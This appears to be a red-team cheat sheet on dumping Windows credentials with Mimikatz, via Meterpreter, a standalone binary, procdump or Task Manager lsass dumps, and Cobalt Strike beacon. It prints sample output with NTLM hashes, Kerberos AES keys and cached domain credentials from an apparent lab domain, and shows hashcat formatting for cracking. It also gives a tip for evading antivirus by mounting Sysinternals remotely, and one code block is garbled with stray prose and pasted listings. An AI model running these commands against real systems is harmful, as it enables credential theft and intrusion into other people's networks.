# Mimikatz

#### MSF
```bash
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > creds_all
meterpreter > lsa_dump_secrets
```

### standalone executable
```cmd
.\mimikatz.exe
# privilege::debug
# lsadump::sam
# lsadump::secrets
# sekurlsa::logonpasswords
```

When is detected by antivirus or Windows defender
**local usage**
```bat
C:\procdump.exe --accepteula -ma lsass.exe lsass.dump
**remote usage: (if you do not want to / cannot put the sysinternals tools on disk)**
net use Z: https://live.sysinternals.com

Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

#### Using the Task Manager
1. Open Task Manager
2. Go to tab Details
3. Search process lsass.exe
4. Right button: Create dump
5. `D:\AppData\Local\Temp\lsass.DMP`

#### Use Mimikatz with lsass.dump
To extract passwd from mini dump use mimikatz
```cmd
mimikatz # sekurlsa::minidump lsass.dmp
Switch to minidump
mimikatz # sekurlsa::logonPasswords
<....>
Mimikatz
	C:\Tools\password_attacks\mimikatz.exe
	privilege::debug

	token::elevate (administrative privilege)

	lsadump::sam

	sekurlsa::logonpasswords

	sekurlsa::tickets
```

## beacon + mimikatz

```powershell
beacon> mimikatz !lsadump::sam
```
 
 The `!` elevates to SYSTEM before running the command; and `@` impersonates Beacon's thread token before running the command.

### Get clear-text passwords and hashes

```powershell
beacon> mimikatz !sekurlsa::logonpasswords

Authentication Id : 0 ; 579458 (00000000:0008d782)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 8/31/2022 11:49:48 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105
	msv :
	 [00000003] Primary
	 * Username : jking
	 * Domain   : DEV
	 * NTLM     : 59fc0f884922b4ce376051134c71e22c
	 * SHA1     : 74fa9854d529092b92e0d9ebef7ce3d065027f45
	 * DPAPI    : 0837e40088a674327961e1d03946f5f2
```

Cobalt Strike also has a short-hand command for this called `logonpasswords`.  After dumping these credentials, go to _View > Credentials_ to see a copy of them.

### Get kerberos Encryption Key
```powershell
beacon> mimikatz !sekurlsa::ekeys

Authentication Id : 0 ; 459935 (00000000:0007049f)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 9/1/2022 7:29:19 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105

	 * Username : jking
	 * Domain   : DEV.CYBERBOTIC.IO
	 * Password : (null)
	 * Key List :
	   aes256_hmac       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
	   rc4_hmac_nt       59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old      59fc0f884922b4ce376051134c71e22c
	   rc4_md4           59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_nt_exp   59fc0f884922b4ce376051134c71e22c
	   rc4_hmac_old_exp  59fc0f884922b4ce376051134c71e22c
```

aes256 is the key that one. These hashes are not automatically populated into the Credential data model, but they can be added manually via _View > Credentials > Add_.

### Dump local accounts (admin)
```powershell
beacon> mimikatz !lsadump::sam
	
Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a
Local SID : S-1-5-21-2281971671-4135076198-2136761646

SAMKey : b0664279732686cfbb4b788c078fea82

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 91b6e660bcac036ae7ab67a3d383bc82
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
```

### Domain Cached Credentials
```powershell
beacon> mimikatz !lsadump::cache

Domain : WKSTN-2
SysKey : b9dc7de8b1972237bbbd7f82d970f79a

Local name : WKSTN-2 ( S-1-5-21-2281971671-4135076198-2136761646 )
Domain name : DEV ( S-1-5-21-569305411-121244042-2357301523 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.18
LSA Key(s) : 1, default {9f88abd7-1cb9-d741-372b-c883b3cbf843}
  [00] {9f88abd7-1cb9-d741-372b-c883b3cbf843} c38164900449d2c6d81b557198ab0cbda2c0ce1c9f57c717cb221032ba1adffb

* Iteration is set to default (10240)

[NL$1 - 9/1/2022 8:10:06 AM]
RID       : 00000450 (1104)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 9/1/2022 10:29:19 AM]
RID       : 00000451 (1105)
User      : DEV\jking
MsCacheV2 : 0d50dee9ed3f29d00282168297090d2a
```

To crack these with [hashcat](https://hashcat.net/hashcat/), we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<hash>`.

* Iteration is set to default (10240)
* User      : DEV\bfarmer
* MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419


## Bibliography
Reference about wdigest:
[](https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-than-a-hash/)